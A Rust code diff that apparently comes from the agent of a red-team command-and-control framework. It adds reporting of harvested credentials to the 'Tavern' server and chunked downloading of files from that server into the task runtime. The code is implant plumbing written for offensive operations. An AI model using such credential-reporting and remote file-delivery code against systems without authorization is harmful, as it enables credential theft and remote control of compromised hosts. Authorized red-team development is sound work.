@@ -1,9 +1,13 @@
 use anyhow::Result;
 use c2::{
-    pb::{ReportProcessListRequest, ReportTaskOutputRequest, TaskError, TaskOutput},
-    TavernClient,
+    pb::{
+        DownloadFileRequest, DownloadFileResponse, ReportCredentialRequest,
+        ReportProcessListRequest, ReportTaskOutputRequest, TaskError, TaskOutput,
+    },
+    Transport,
 };
-use eldritch::Output;
+use eldritch::FileRequest;
+use std::sync::mpsc::channel;
 use tokio::task::JoinHandle;
 
 /*
@@ -11,29 +15,42 @@ use tokio::task::JoinHandle;
  */
 pub struct TaskHandle {
     id: i64,
-    handle: JoinHandle<()>,
-    output: Output,
+    runtime: eldritch::Runtime,
+    download_handles: Vec<JoinHandle<()>>,
 }
 
 impl TaskHandle {
     // Track a new task handle.
-    pub fn new(id: i64, output: Output, handle: JoinHandle<()>) -> TaskHandle {
-        TaskHandle { id, handle, output }
+    pub fn new(id: i64, runtime: eldritch::Runtime) -> TaskHandle {
+        TaskHandle {
+            id,
+            runtime,
+            download_handles: Vec::new(),
+        }
     }
 
     // Returns true if the task has been completed, false otherwise.
     pub fn is_finished(&self) -> bool {
-        self.handle.is_finished()
+        // Check File Downloads
+        for handle in &self.download_handles {
+            if !handle.is_finished() {
+                return false;
+            }
+        }
+
+        // Check Task
+        self.runtime.is_finished()
     }
 
     // Report any available task output.
-    pub async fn report(&mut self, tavern: &mut TavernClient) -> Result<()> {
-        let exec_started_at = self.output.get_exec_started_at();
-        let exec_finished_at = self.output.get_exec_finished_at();
-        let text = self.output.collect();
-        let err = self.output.collect_errors().pop().map(|err| TaskError {
-                msg: err.to_string(),
-            });
+    // Also responsible for downloading any files requested by the eldritch runtime.
+    pub async fn report(&mut self, tavern: &mut impl Transport) -> Result<()> {
+        let exec_started_at = self.runtime.get_exec_started_at();
+        let exec_finished_at = self.runtime.get_exec_finished_at();
+        let text = self.runtime.collect_text();
+        let err = self.runtime.collect_errors().pop().map(|err| TaskError {
+            msg: err.to_string(),
+        });
 
         #[cfg(debug_assertions)]
         log::info!(
@@ -75,20 +92,111 @@ impl TaskHandle {
                 .await?;
         }
 
+        // Report Credential
+        let credentials = self.runtime.collect_credentials();
+        for cred in credentials {
+            #[cfg(debug_assertions)]
+            log::info!("reporting credential (task_id={}): {:?}", self.id, cred);
+
+            match tavern
+                .report_credential(ReportCredentialRequest {
+                    task_id: self.id,
+                    credential: Some(cred),
+                })
+                .await
+            {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "failed to report credential (task_id={}): {}",
+                        self.id,
+                        _err
+                    );
+                }
+            }
+        }
+
         // Report Process Lists
-        let process_lists = self.output.collect_process_lists();
+        let process_lists = self.runtime.collect_process_lists();
         for list in process_lists {
             #[cfg(debug_assertions)]
             log::info!("reporting process list: len={}", list.list.len());
 
-            tavern
+            match tavern
                 .report_process_list(ReportProcessListRequest {
                     task_id: self.id,
                     list: Some(list),
                 })
-                .await?;
+                .await
+            {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "failed to report process list: task_id={}: {}",
+                        self.id,
+                        _err
+                    );
+                }
+            }
         }
 
+        // Download Files
+        let file_reqs = self.runtime.collect_file_requests();
+        for req in file_reqs {
+            let name = req.name();
+            match self.start_file_download(tavern, req).await {
+                Ok(_) => {
+                    #[cfg(debug_assertions)]
+                    log::info!("started file download: task_id={}, name={}", self.id, name);
+                }
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "failed to download file: task_id={}, name={}: {}",
+                        self.id,
+                        name,
+                        _err
+                    );
+                }
+            }
+        }
+        Ok(())
+    }
+
+    async fn start_file_download(
+        &mut self,
+        tavern: &mut impl Transport,
+        req: FileRequest,
+    ) -> Result<()> {
+        let (tx, rx) = channel::<DownloadFileResponse>();
+
+        tavern
+            .download_file(DownloadFileRequest { name: req.name() }, tx)
+            .await?;
+
+        let handle = tokio::task::spawn_blocking(move || {
+            for r in rx {
+                match req.send_chunk(r.chunk) {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!(
+                            "failed to send downloaded file chunk: {}: {}",
+                            req.name(),
+                            _err
+                        );
+
+                        return;
+                    }
+                }
+            }
+            #[cfg(debug_assertions)]
+            log::info!("file download completed: {}", req.name());
+        });
+
+        self.download_handles.push(handle);
         Ok(())
     }
 }
